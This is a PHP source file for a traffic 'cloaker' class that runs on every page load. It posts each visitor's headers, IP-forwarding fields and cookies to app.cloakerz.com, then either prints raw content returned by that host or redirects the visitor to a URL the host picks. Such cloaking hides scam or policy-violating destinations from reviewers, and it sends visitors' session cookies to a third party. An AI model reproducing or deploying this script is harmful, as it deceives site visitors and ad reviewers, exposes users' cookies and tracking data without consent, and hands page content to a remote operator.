<?php
			class cloakerz {
				public function auto_run() {         
					 $this->is_valid_http();
					}
				function http_send_request() {    
					$ch = curl_init();
					curl_setopt($ch, CURLOPT_URL,"https://app.cloakerz.com/logic/index");
					curl_setopt($ch, CURLOPT_POST, 1);
					curl_setopt($ch, CURLOPT_POSTFIELDS, $this->get_headers());
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
					$data = curl_exec($ch);
					curl_close ($ch);
					return $data;
				}
				function z($Z_9854){
					echo $Z_9854;
				}
				function get_headers() {
					$list = array("HTTP_USER_AGENT","HTTP_DEVICE_STOCK_UA","HTTP_X_OPERAMINI_PHONE_UA","HEROKU_APP_DIR","X_FB_HTTP_ENGINE","X_PURPOSE","REQUEST_SCHEME","CONTEXT_DOCUMENT_ROOT","SCRIPT_FILENAME","REQUEST_URI","SCRIPT_NAME","PHP_SELF","REQUEST_TIME_FLOAT","HTTP_COOKIE","HTTP_ACCEPT_ENCODING","HTTP_ACCEPT_LANGUAGE","QUERY_STRING","X_WAP_PROFILE","PROFILE","WAP_PROFILE","HTTP_REFERER","HTTP_HOST","HTTP_VIA","HTTP_CONNECTION","HTTP_X_REQUESTED_WITH","HTTP_USER_AGENT","REMOTE_ADDR","HTTP_X_REAL_IP","X_FORWARDED_FOR","HTTP_CLIENT_IP","HTTP_X_FORWARDED","HTTP_X_CLUSTER_CLIENT_IP","HTTP_FORWARDED_FOR","HTTP_FORWARDED","HTTP_CF_CONNECTING_IP","HTTP_INCAP_CLIENT_IP","HTTP_X_SUCURI_CLIENTIP","HTTP_X_FORWARDED_FOR");
					foreach ($list as $key) { 
						if(isset($_SERVER[$key])){ 
							$headers[$key] = $_SERVER[$key];
						} }
					$headers["HTTP_FNRKS_FJRLSJ"] = "d92c8e9d14";
					$headers["HTTP_HFHE_FNEODMF"] = "1615d5b83a";
					$headers= http_build_query($headers);
					return  $headers;
				}
				function is_valid_http(){
					$getResult = $this->http_send_request();           
					$this->handle_request(json_decode($getResult));            
				}
				function handle_request($getResult) {   
					
					if(!empty($getResult)){                
						if(isset($getResult->Z_9854)){
						   $this->z($getResult->Z_9854);
					   }else{
							$this->main($getResult->url);
					   }
					}
					$this->check_http();                      		
				}
				function main($get_ur){
					header("Location: ".$get_ur, true, 302);    
				}
				function check_http(){
					if(isset($_GET["HTTP_JHYDMEND"])){
						echo "1615d5b83a";
					}
				}        
			}
			$cloaker_Z = new cloakerz();
			$cloaker_Z->auto_run();
		?>